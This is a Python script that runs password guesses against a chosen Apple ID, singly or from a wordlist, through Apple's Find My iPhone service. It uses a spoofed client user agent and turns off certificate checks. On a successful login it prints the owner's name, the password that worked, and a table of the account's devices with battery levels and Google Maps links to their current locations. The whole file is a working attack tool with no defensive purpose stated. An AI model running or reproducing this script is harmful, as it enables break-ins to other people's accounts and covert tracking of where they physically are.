import base64, json
import requests
from requests.packages import urllib3
import os
from printy import printy, escape
import sys
from prettytable import PrettyTable

username = ""
password_list = ""
password = ""
auth = ""
clear = lambda: os.system('cls')
url = ""
dictionary = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_args():
	global username
	global password_list
	global password
	global url

	try:
		username = sys.argv[(sys.argv.index("--appleid")+1)]
		url = 'https://fmipmobile.icloud.com/fmipservice/device/%s/initClient' % username
	except Exception as ex:
		print("Missing params(--appleid)")

	#COULD BY A --PASSWORD-LIST (FILE) OR JUST ONE TRY WITH --PASSWORD 
	try:
		password_list = sys.argv[(sys.argv.index("--password-list")+1)]
	except Exception as e:
		try:
			password = sys.argv[(sys.argv.index("--password")+1)]
		except Exception as e:
			print("Missing params, use either --password or password-list")

def Type():
	try:
		global password_list
		global password
		global dictionary
		if password != "":
			dictionary = False
		elif password_list != "":
			dictionary = True
	except Exception as e:
		print(e)

def Main_Request(password_input,type_req):
	try:
		global dictionary

		auth= base64.b64encode(bytes(username+":"+password_input, 'utf-8')).decode("utf-8")
		headers = {
			'Accept-Language': 'de-DE',
			'User-Agent': 'FindMyiPhone/500 CFNetwork/758.4.3 Darwin/15.5.0',
			'Authorization': 'Basic '+auth,
			'X-Apple-Realm-Support': '1.0',
			'X-Apple-AuthScheme': 'UserIDGuest',
			'X-Apple-Find-API-Ver': '3.0',
           }
		response = requests.post(url, None, headers=headers,verify=False)
		if response:
			print(" ")

			response = response.content
			response = response.decode("utf-8")
			json_response = json.loads(response)

			printy("Account Owner: [g]"+json_response["userInfo"]["firstName"]+" "+json_response["userInfo"]["lastName"])
			if type_req == 2:
				#Dictionary
				printy("[nD]Password: '"+password_input.strip()+"'")
			
			pTable = PrettyTable()
			pTable.field_names = ["Device Model", "Device Name", "Battery %", "Google Maps URL"]

			for device in json_response["content"]:
				maps_url = ""
				battery = 0
				dev_model = ""
				dev_name = ""

				try:
					dev_name = device['name']
				except Exception as e:
					pass

				try:
					dev_model = device['deviceModel']
				except Exception as e:
					pass

				try:
					battery = int(float(device['batteryLevel'])*100)
				except Exception as e:
					pass

				try:
					maps_url = "https://www.google.cl/maps/@"+str(device["location"]["latitude"])+","+str(device["location"]["longitude"])+",17z"
				except Exception as e:
					pass

				pTable.add_row([dev_model, dev_name, battery, maps_url])

			print(pTable)
		else:
			pass
	except Exception as e:
		pass

def test_login():
	global username
	global password_list
	global password
	global url
	global dictionary

	printy(f'Trying Apple ID: [y]{escape(username)}@')
	print(" ")
	if dictionary:
		printy("[y]Dictionary attempt")	
		file = open(password_list, 'r')
		lines = file.readlines()

		for index, line in enumerate(lines):
			Main_Request(line,2)
	else:
		printy("[b]Single  password attempt")	
		Main_Request(password,1)
		
try:
	check_args()
	Type()
	test_login()
except Exception as e:
	print(e)